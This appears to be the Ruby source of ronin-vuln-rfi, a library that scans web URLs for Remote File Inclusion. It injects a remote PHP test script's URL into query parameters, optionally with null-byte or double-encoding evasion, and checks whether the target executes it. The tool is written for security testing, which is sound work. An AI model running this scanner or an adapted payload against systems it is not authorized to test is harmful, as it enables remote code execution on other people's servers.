#
# ronin-vuln-rfi - A small Ruby library for testing Remote File Inclusion (RFI)
# vulnerabilities.
#
# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-vuln-rfi is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-vuln-rfi is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-vuln-rfi.  If not, see <https://www.gnu.org/licenses/>.
#

require 'uri/query_params'
require 'net/https'

module Ronin
  module Vuln
    class RFI

      # Default URL of the Remote File Inclusion (RFI) Test script.
      TEST_SCRIPT_URL = 'https://raw.githubusercontent.com/ronin-rb/ronin-vuln-rfi/main/data/test.php'

      # The string that will be returned if the Remote File Inclusion (RFI)
      # script is executed.
      VULN_RESPONSE_STRING = "Remote File Inclusion (RFI) Detected: eval(\"1 + 1\") = 2"

      # The url to test or was found to be vulnerable.
      #
      # @return [URI::HTTP]
      attr_reader :url

      # The query parameter to test or was found to be vulnerable.
      #
      # @return [String]
      attr_reader :param

      # The evasion technique to use.
      #
      # @return [nil, :null_byte, :double_encode]
      attr_reader :evasion

      # URL of the Remote File Inclusion (RFI) Test script
      # 
      # @return [String, URI::HTTP]
      attr_reader :test_script_url

      #
      # Creates a new Remote File Inclusion (RFI) object.
      #
      # @param [String, URI::HTTP] url
      #   The URL to attempt to exploit.
      #
      # @param [String, Symbol] param
      #   The query parameter to attempt RFI on.
      #
      # @param [nil, :null_byte] evasion
      #   Specifies which evasion technique to use.
      #   * `:null_byte` will cause the inclusion URL to be appended with a
      #     `%00` character.
      #   * `:double_encode` will cause the inclusion URL to be URI escaped
      #     twice.
      #
      # @param [String, URI::HTTP] test_script_url
      #   The URL of the RFI test script.
      #
      # @param [Net::HTTP, #get, nil] http
      #   An HTTP session to use for testing the RFI.
      #
      def initialize(url,param, test_script_url: self.class.test_script_url,
                                evasion:         nil,
                                http:            nil)
        @url   = URI(url)
        @param = param.to_s

        @test_script_url = test_script_url
        @evasion     = evasion
        @http        = http
      end

      #
      # Specifies the URL to the Remote File Inclusion (RFI) testing script.
      #
      # @return [String]
      #   The URL to the RFI testing script.
      #
      def self.test_script_url
        @test_script_url ||= TEST_SCRIPT_URL
      end

      #
      # Uses a new URL for the Remote File Inclusion (RFI) testing script.
      #
      # @param [String] new_url
      #   The new URL to the RFI testing script.
      #
      # @return [String]
      #   The new URL to the RFI testing script.
      #
      def self.test_script_url=(new_url)
        @test_script_url = new_url
      end

      #
      # Scans the URL for Remote File Inclusion (RFI) vulnerabilities.
      #
      # @param [URI::HTTP, String] url
      #   The URL to scan.
      #
      # @param [String, Symbol, nil] param
      #   Optional query parameter to test specifically.
      #   Defaults to testing all query parameters in the URL.
      #
      # @param [nil, :null_byte, :double_encode] evasion
      #   Optional evasion technic to specifically use.
      #   Defaults to testing all evasion techniques.
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments for {#initialize}.
      #
      # @return [RFI, nil]
      #   The first discovered RFI vulnerability.
      #
      def self.test(url, param: nil, evasion: nil, **kwargs)
        url = URI(url)

        params = if param then [param.to_s]
                 else          url.query_params.key
                 end

        evasions = if evasion then [evasion]
                   else            [nil, :null_byte, :double_encode]
                   end

        evasions.each do |evasion|
          params.each do |param|
            rfi = self.new(url,param, evasion: evasion, **kwargs)

            return rfi if rfi.vulnerable?
          end
        end

        return nil
      end

      #
      # Tests all query parameters in the URL for Remote File Inclusion (RFI)
      # vulnerabilities.
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments for {test}.
      #
      # @yield [rfi]
      #   If a block is given, it will be passed each newly discovered RFI
      #   vulnerability.
      #
      # @yieldparam [RFI] rfi
      #   A newly discoverd RFI vulnerability in one of the URL's query
      #   parameters.
      #
      # @return [Array<RFI>]
      #   All discovered RFI vulnerabilities.
      #
      def self.scan(url, **kwargs)
        url   = URI(url)
        vulns = []

        url.query_params.each_key do |param|
          if (rfi = test(url, param: param, **kwargs))
            yield rfi if block_given?
            vulns << rfi
          end
        end

        return vulns
      end

      #
      # Builds a Remote File Inclusion (RFI) URL.
      #
      # @param [String, URI::HTTP] rfi_url
      #   The URL of the PHP script to include remotely.
      #
      # @param [Hash{String,Symbol => #to_s}] additional_params
      #   Additional query parameters to add to the RFI URL.
      #
      # @return [URI::HTTP]
      #   The URL to use to trigger the RFI.
      #
      def url_for(rfi_url,additional_params={})
        rfi_url = rfi_url.to_s
        new_url = @url.clone
        new_url.query_params.merge!(additional_params)

        case @evasion
        when :null_byte
          # Optionally append a null-byte
          # NOTE: uri-query_params will automatically URI encode the null byte
          rfi_url = "#{rfi_url}\0"
        when :double_encode
          # Optionally double URI encodes the script URL
          rfi_url = URI::QueryParams.escape(rfi_url)
        end

        new_url.query_params[@param.to_s] = rfi_url
        return new_url
      end

      #
      # Performs a Remote File Inclusion (RFI).
      #
      # @param [String, URI::HTTP] rfi_url
      #   The URL of the PHP script to include remotely.
      #
      # @return [String]
      #   The body of the response from the RFI.
      #
      def get(rfi_url)
        url = url_for(rfi_url)

        if @http
          @http.get(url.request_uri)
        else
          Net::HTTP.get(url)
        end
      end

      #
      # Tests whether the URL and query parameter are vulnerable to Remote File
      # Inclusion (RFI).
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable to RFI.
      #
      def vulnerable?
        response = get(@test_script_url)

        return response.include?(VULN_RESPONSE_STRING)
      end

    end
  end
end
